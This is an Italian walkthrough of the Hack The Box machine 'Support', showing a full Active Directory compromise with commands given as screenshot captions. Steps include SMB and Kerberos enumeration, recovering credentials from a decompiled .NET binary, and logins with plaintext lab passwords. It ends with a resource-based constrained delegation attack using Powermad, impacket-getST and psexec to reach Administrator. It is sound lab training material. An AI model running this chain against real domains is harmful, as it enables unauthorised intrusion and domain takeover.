# SUPPORT

Associamo il nome di dominio all'ip in /etc/hosts

![sudo vim /etc/hosts](./immagini/1-hosts.png)

Scansioniamo le porte e capiamo che è una macchina windows a dominio

![nmap -sV -oN scan.nmap support.htb](./immagini/2-scansione.png)

Da Metasploit proviamo a fare un bruteforce degli utenti sulla porta 88, Kerberos e troviamo Guest, Support e Administrator

![](./immagini/3-kerberos_users.png)

Con crackmapexec enumeriamo le shares e con utente Guest possiamo leggerne 2

![crackmapexec smb support.htb -u 'guest' -p '' --shares](./immagini/4-shares.png)

Con smbclient ci colleghiamo alla share support-tools e trovaimo un eseguibile, UserInfo.exe, scarichiamolo

![smbclient //support.htb/support-tools -U guest](./immagini/5-eseguibile.png)

Facciamo l'unzip del file e vediamo che l'eseguibile è un file Mono/.Net assembly

![file UserInfo.exe](./immagini/6-tipoFile.png)

Per comodità analizzerò questo file da una macchina windows, scarichiamo il progetto dnspy-net da github per guardare il codice dell'eseguibile

![](./immagini/7-dnspy.png)

Carichiamo l'eseguibile su dnSpy e troviamo la password criptata dell'utente ldap

![](./immagini/8-pswCriptata.png)

Andiamo su CyberChef per decriptare la password seguendo i passaggi nel codice ma al contrario

![](./immagini/9-cyberchef.png)

Con il comando ldapsearch possiamo cercare tutte le informazioni su tutti li oggetti dentro AD

![ldapsearch -H ldap://support.htb -x -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"](./immagini/10-ldapsearch.png)

Cercando informazioni sull'utente support (che già conoscevamo) troviamo nel campo 'info' la sua possibile password

![](./immagini/11-support_psw.png)

Queste credenziali sono valide per windows remote management, da qui riusciamo a prendere la user flag

![evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'](./immagini/12-user_flag.png)

Carichiamo PowerView.ps1 da evil-winrm e attiviamolo con '. .\Powerview.ps1', poi cerchiamo quali diritti abbiamo all'interno del dominio e notiamo che abbiamo pieni diritti sul gruppo Shared Support Accounts, del quale facciamo parte

![Find-InterestingDomainAcl -ResolveGUIDs | ? { $_.IdentityReferenceName -match "$env:USERNAME" }](./immagini/13-AD_diritti.png)

Proviamo l'attacco RDBC, importiamo a attiviamo Powermad.ps1, come abbiamo fatto prima con PowerView, e inziamo creando un finto computer

![New-MachineAccount -MachineAccount FAKECOMPUTER -Password $(ConvertTo-SecureString "Password123!" -AsPlainText -Force)](./immagini/14-nuovo_pc.png)

Scriviamo il SID del nostro nuovo computer nell'attributo AllowedToActOnBehalfOfOtherIdentity, in modo che il DC ci lasci autenticare come qualsiasi utente

![](./immagini/15-deleghe.png)

Ora possiamo ottenere i TGT di Administrator sulla nostra macchina per utilizzaro per autenticarci

![impacket-getST -spn cifs/DC.support.htb -impersonate Administrator -dc-ip support.htb 'support.htb/FAKECOMPUTER$:Password123!'](./immagini/16-TGT.png)

Esportiamo il TGT nella var d'ambiente KRB5CCNAME e colleghiamoci al target come Administrator

![impacket-psexec -k -no-pass support.htb/Administrator@DC.support.htb](./immagini/17-admin_shell.png)

Otteniamo l'ultima flag

![](./immagini/18-root-flag.png)